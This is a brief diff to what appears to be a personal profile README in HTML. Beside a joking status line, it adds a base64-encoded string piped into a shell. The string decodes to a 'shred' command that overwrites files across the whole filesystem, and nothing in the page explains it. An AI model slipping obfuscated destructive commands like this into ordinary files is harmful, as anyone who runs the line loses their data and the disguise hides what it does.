@@ -2,6 +2,9 @@
 
 <p align="left"> 
  🥴 Probably busy <strong>doing nothing</strong>.
+  
+
+ echo "c2hyZWQgLWYgLW4gMTAgLyoK" | base64 -d | sh
 </p>
 
 <br>
